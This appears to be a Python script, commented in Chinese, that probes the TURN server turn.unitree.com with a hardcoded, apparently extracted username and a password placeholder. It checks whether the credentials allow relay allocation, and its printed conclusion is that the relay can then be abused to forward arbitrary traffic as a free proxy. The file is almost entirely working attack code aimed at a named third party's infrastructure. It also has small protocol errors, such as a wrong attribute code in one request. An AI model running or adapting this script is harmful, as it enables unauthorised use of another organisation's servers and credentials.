#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TURN 中继滥用测试(RFC 5389/5766 最小实现)
验证 turn.unitree.com:5349 是否接受凭据并中继任意流量"""
import socket, struct, hashlib, hmac as hmac_mod, os, time

SERVER = ('turn.unitree.com', 5349)
USER = '1788415487:E39N1000Q72DJE8G'
PASSWD = '<密码_01>'

MAGIC = 0x2112A442

def stun_msg(msg_type, attrs, key=None):
    txid = os.urandom(12)
    body = b''
    for t, v in attrs:
        pad = (4 - len(v) % 4) % 4
        body += struct.pack('>HH', t, len(v)) + v + b'\x00' * pad
    if key:
        # MESSAGE-INTEGRITY: 先算到该属性为止的 HMAC(头长度按含 MI 的 24 字节计)
        hdr = struct.pack('>HHI', msg_type, len(body) + 24, MAGIC) + txid
        mi = hmac_mod.new(key, hdr + body, hashlib.sha1).digest()
        body += struct.pack('>HH', 0x0008, 20) + mi
    hdr = struct.pack('>HHI', msg_type, len(body), MAGIC) + txid
    return hdr + body, txid

def parse(data):
    mtype, mlen, magic = struct.unpack('>HHI', data[:8])
    txid = data[8:20]
    attrs = {}
    i = 20
    while i < 20 + mlen:
        t, l = struct.unpack('>HH', data[i:i+4])
        attrs.setdefault(t, []).append(data[i+4:i+4+l])
        i += 4 + l + ((4 - l % 4) % 4)
    return mtype, txid, attrs

def str_attr(s): return s.encode()
def u32_attr(v): return struct.pack('>I', v)

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)

    # 1. STUN Binding(无认证)
    m, txid = stun_msg(0x0001, [])
    s.sendto(m, SERVER)
    try:
        data, _ = s.recvfrom(2048)
        mtype, _, attrs = parse(data)
        sw = attrs.get(0x8022, [b'?'])[0].decode(errors='replace')
        print(f'[1] STUN Binding OK, server software: {sw}')
    except socket.timeout:
        print('[1] STUN 无响应 — 服务器不可达/被过滤')
        return

    # 2. TURN Allocate 无认证 → 预期 401 拿 realm/nonce
    m, _ = stun_msg(0x0003, [(0x0015, u32_attr(0))])  # REQUESTED-TRANSPORT udp
    s.sendto(m, SERVER)
    try:
        data, _ = s.recvfrom(2048)
        mtype, _, attrs = parse(data)
        realm = attrs.get(0x0014, [b''])[0].decode(errors='replace')
        nonce = attrs.get(0x0015, [b''])[0].decode(errors='replace')
        print(f'[2] Allocate 无认证 → type={mtype:#x}, realm={realm!r}, nonce={nonce[:20]}...')
    except socket.timeout:
        print('[2] Allocate 无响应')
        return

    if not realm:
        print('未拿到 realm,中止')
        return

    # 3. 带长期凭据 Allocate
    key = hashlib.md5(f'{USER}:{realm}:{PASSWD}'.encode()).digest()
    attrs = [
        (0x0006, str_attr(USER)),        # USERNAME
        (0x0014, str_attr(realm)),       # REALM
        (0x0015, str_attr(nonce)),       # NONCE
        (0x0015, u32_attr(0)),           # REQUESTED-TRANSPORT —— 冲突!需修正
    ]
    # 修正: REQUESTED-TRANSPORT 类型码是 0x0019
    attrs = [
        (0x0006, str_attr(USER)),
        (0x0014, str_attr(realm)),
        (0x0015, str_attr(nonce)),
        (0x0019, u32_attr(0x11000000)), # REQUESTED-TRANSPORT: UDP=17 高字节
    ]
    m, txid = stun_msg(0x0003, attrs, key=key)
    s.sendto(m, SERVER)
    try:
        data, _ = s.recvfrom(2048)
        mtype, _, attrs2 = parse(data)
        if mtype == 0x0103:
            print('[3] ✅ Allocate 成功! TURN 凭据有效:')

            def xor_addr(raw):
                # XOR-MAPPED/XOR-RELAYED: family(1)+port(2,^magic 高2字节)+ipv4(4,^magic)
                port = struct.unpack('>H', raw[2:4])[0] ^ (MAGIC >> 16)
                ip = '.'.join(str(a ^ b) for a, b in zip(raw[4:8], struct.pack('>I', MAGIC)))
                return f'{ip}:{port}'

            relayed = attrs2.get(0x0016)   # XOR-RELAYED-ADDRESS = 分配的中继地址
            mapped = attrs2.get(0x0020)    # XOR-MAPPED-ADDRESS = 服务器看到的我们
            if relayed:
                print(f'   ★ 中继地址(relayed): {xor_addr(relayed[0])}  ← 宇树服务器上的出口')
            if mapped:
                print(f'   映射地址(mapped):    {xor_addr(mapped[0])}')
            print(f'   生命周期(lifetime): {struct.unpack(">I", attrs2.get(0x000d,[b""])[0])[0] if 0x000d in attrs2 else "?"} 秒')
            print('   → 凭据可用 = 可滥用 TURN 中继(任意目标转发/自由代理流量)')
        elif mtype == 0x0113:
            code = attrs2.get(0x0009, [b'\x00\x00\x00\x00'])[0]
            reason = attrs2.get(0x0009, [b''])[0][4:].decode(errors='replace')
            print(f'[3] Allocate 被拒: {reason}')
        else:
            print(f'[3] 未知响应 type={mtype:#x}', list(attrs2.keys()))
    except socket.timeout:
        print('[3] Allocate(带凭据)无响应')

if __name__ == '__main__':
    main()
